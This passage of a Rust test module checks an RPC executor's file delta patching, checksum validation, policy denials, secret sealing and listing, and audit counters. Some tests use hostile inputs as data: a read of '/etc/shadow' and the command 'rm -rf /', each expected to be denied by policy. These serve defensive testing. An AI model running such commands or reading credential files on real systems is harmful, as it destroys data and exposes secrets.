            .collect();

        let exec = make_delta_executor(canonical.to_str().unwrap());

        // Only send the changed block (offset 64)
        let req = Request {
            id: "dp-partial".into(),
            action: Action::FileDeltaPatch {
                path: path.to_str().unwrap().into(),
                block_size: block_size as u32,
                patches: vec![rf_rpc::types::DeltaPatch {
                    offset: block_size as u64,
                    data: updated[block_size..block_size * 2].to_vec(),
                }],
                total_size: updated.len() as u64,
                checksum: Some(checksum),
                mode: None,
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match resp.result {
            RpcResult::FileDeltaApplied {
                blocks_changed,
                total_blocks,
                checksum_verified,
                bytes_transferred,
            } => {
                assert_eq!(blocks_changed, 1, "only 1 block changed");
                assert_eq!(total_blocks, 4);
                assert!(checksum_verified);
                assert_eq!(bytes_transferred, block_size as u64);
            }
            other => panic!("expected FileDeltaApplied, got {other:?}"),
        }
        let written = tokio::fs::read(&path).await.unwrap();
        assert_eq!(written, updated);
    }

    #[tokio::test]
    async fn test_file_delta_patch_checksum_mismatch() {
        let dir = tempfile::tempdir().unwrap();
        let canonical = dir.path().canonicalize().unwrap();
        let path = canonical.join("delta_patch_bad_cs.bin");
        let content: Vec<u8> = vec![42u8; 128];

        let exec = make_delta_executor(canonical.to_str().unwrap());

        let req = Request {
            id: "dp-badcs".into(),
            action: Action::FileDeltaPatch {
                path: path.to_str().unwrap().into(),
                block_size: 64,
                patches: vec![rf_rpc::types::DeltaPatch {
                    offset: 0,
                    data: content[..64].to_vec(),
                }],
                total_size: 64,
                checksum: Some("0".repeat(64)), // deliberately wrong
                mode: None,
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        assert!(
            matches!(resp.result, RpcResult::Error { .. }),
            "expected error on checksum mismatch, got {:?}",
            resp.result
        );
    }

    #[tokio::test]
    async fn test_file_delta_query_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        // Policy only allows /tmp — query against /etc should be denied
        let yaml = "spec:\n  filesystem:\n    allow:\n      - path: /tmp\n  resources:\n    maxFileSizeBytes: 10485760\n    timeoutSeconds: 30\n";
        let policy = Arc::new(RwLock::new(RpcPolicy::from_yaml(yaml).unwrap()));
        let exec = Executor::new(policy, audit, "delta-deny".into());

        let req = Request {
            id: "dq-deny".into(),
            action: Action::FileDeltaQuery {
                path: "/etc/shadow".into(),
                block_size: 4096,
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        assert!(
            matches!(resp.result, RpcResult::Denied { .. }),
            "expected Denied, got {:?}",
            resp.result
        );
    }

    #[tokio::test]
    async fn test_adler32_correctness() {
        // Known Adler-32 values for simple inputs
        // adler32("") = 1 (initial A=1, B=0 → (0<<16)|1 = 1)
        assert_eq!(Executor::adler32(b""), 1);
        // adler32("a"): 'a'=97, A=1+97=98, B=0+98=98 → (98<<16)|98 = 6422626
        assert_eq!(Executor::adler32(b"a"), 6422626);
        // adler32("Wikipedia") = 0x11E60398 (manually verified)
        let result = Executor::adler32(b"Wikipedia");
        assert_eq!(result, 0x11E6_0398);
    }

    /// Helper: make an executor with an empty in-memory secret store and an allow-all policy.
    fn make_executor_with_secrets(audit: Arc<dyn AuditLogger>) -> Executor {
        let yaml = r#"
spec:
  commands:
    allow:
      - pattern: ".*"
  filesystem:
    allow:
      - path: /
  resources:
    maxOutputBytes: 1048576
    timeoutSeconds: 30
"#;
        let policy = Arc::new(RwLock::new(RpcPolicy::from_yaml(yaml).unwrap()));
        let store = Arc::new(tokio::sync::Mutex::new(SecretStore::new([0u8; 32])));
        Executor::new(policy, audit, "test-caller-key".into()).with_secrets(store)
    }

    #[tokio::test]
    async fn test_seal_new_secret() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor_with_secrets(audit.clone());

        let req = Request {
            id: "seal-1".into(),
            action: Action::SealSecret {
                name: "api_key".into(),
                value: "super-secret".into(),
                grace_period_secs: 0,
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match resp.result {
            RpcResult::SecretSealed {
                name,
                rotated,
                value_hash,
            } => {
                assert_eq!(name, "api_key");
                assert!(!rotated, "should not be marked as rotated for new secret");
                assert!(!value_hash.is_empty());
            }
            other => panic!("expected SecretSealed, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn test_seal_existing_secret_with_grace() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor_with_secrets(audit.clone());

        // First — seal the initial value.
        let req1 = Request {
            id: "seal-2a".into(),
            action: Action::SealSecret {
                name: "db_pass".into(),
                value: "old-value".into(),
                grace_period_secs: 0,
            },
            timeout_ms: None,
            reason: None,
        };
        let resp1 = exec.handle(req1).await;
        assert!(
            matches!(resp1.result, RpcResult::SecretSealed { rotated: false, .. }),
            "first seal should not be a rotation"
        );

        // Second — rotate with grace period.
        let req2 = Request {
            id: "seal-2b".into(),
            action: Action::SealSecret {
                name: "db_pass".into(),
                value: "new-value".into(),
                grace_period_secs: 60,
            },
            timeout_ms: None,
            reason: None,
        };
        let resp2 = exec.handle(req2).await;
        match resp2.result {
            RpcResult::SecretSealed { name, rotated, .. } => {
                assert_eq!(name, "db_pass");
                assert!(rotated, "second seal should be flagged as rotation");
            }
            other => panic!("expected SecretSealed, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn test_list_secrets() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor_with_secrets(audit.clone());

        // Seal a couple of secrets.
        for (name, value) in [("alpha", "v1"), ("gamma", "v2"), ("beta", "v3")] {
            let req = Request {
                id: format!("seal-{name}"),
                action: Action::SealSecret {
                    name: name.to_string(),
                    value: value.to_string(),
                    grace_period_secs: 0,
                },
                timeout_ms: None,
                reason: None,
            };
            exec.handle(req).await;
        }

        let list_req = Request {
            id: "list-1".into(),
            action: Action::ListSecrets,
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(list_req).await;
        match resp.result {
            RpcResult::SecretsList { names } => {
                // Should be sorted.
                assert_eq!(names, vec!["alpha", "beta", "gamma"]);
            }
            other => panic!("expected SecretsList, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn test_seal_secret_no_store_returns_error() {
        // Use standard executor without a secret store.
        // The executor uses deny-by-default policy, so the request will be
        // either Denied (policy blocks the path) or Error (no store). Both are
        // valid non-success outcomes.
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "seal-no-store".into(),
            action: Action::SealSecret {
                name: "key".into(),
                value: "val".into(),
                grace_period_secs: 0,
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        assert!(
            matches!(
                resp.result,
                RpcResult::Error { .. } | RpcResult::Denied { .. }
            ),
            "should return Error or Denied when secret store is not accessible: {:?}",
            resp.result,
        );
    }

    #[tokio::test]
    async fn test_list_secrets_no_store_returns_error() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "list-no-store".into(),
            action: Action::ListSecrets,
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        assert!(
            matches!(resp.result, RpcResult::Error { .. }),
            "should return Error when no secret store is configured: {:?}",
            resp.result,
        );
    }

    /// Regression test: `handle_execute` must increment the `audit_entries`
    /// Prometheus counter for BOTH allowed and denied commands.
    /// Previously the counter stayed at 0 for `Execute` actions because
    /// `handle_execute` wrote directly via `self.audit.log()` without
    /// incrementing the counter (the `self.audit()` helper increments it,
    /// but `handle_execute` did not use that helper).
    #[tokio::test]
    async fn test_execute_increments_audit_entries_counter() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone()).with_counters(
            Some(Arc::new(std::sync::atomic::AtomicU64::new(0))),
            Some(Arc::new(std::sync::atomic::AtomicU64::new(0))),
            Some(Arc::new(std::sync::atomic::AtomicU64::new(0))),
            Some(Arc::new(std::sync::atomic::AtomicI64::new(0))),
            Some(Arc::new(std::sync::atomic::AtomicU64::new(0))),
            Some(Arc::new(std::sync::atomic::AtomicU64::new(0))),
        );

        // Allowed command
        let allowed_req = Request {
            id: "allowed".into(),
            action: Action::Execute {
                command: "echo hi".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };
        let _ = exec.handle(allowed_req).await;

        // Denied command
        let denied_req = Request {
            id: "denied".into(),
            action: Action::Execute {
                command: "rm -rf /".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };
        let _ = exec.handle(denied_req).await;

        // audit_entries counter is the 3rd element (index 2)
        let audit_entries_counter = exec
            .audit_entries
            .as_ref()
            .expect("audit_entries counter should be wired");
        assert_eq!(
            audit_entries_counter.load(std::sync::atomic::Ordering::Relaxed),
            2,
            "audit_entries counter should be 2 (one allowed + one denied)"
        );
    }
}
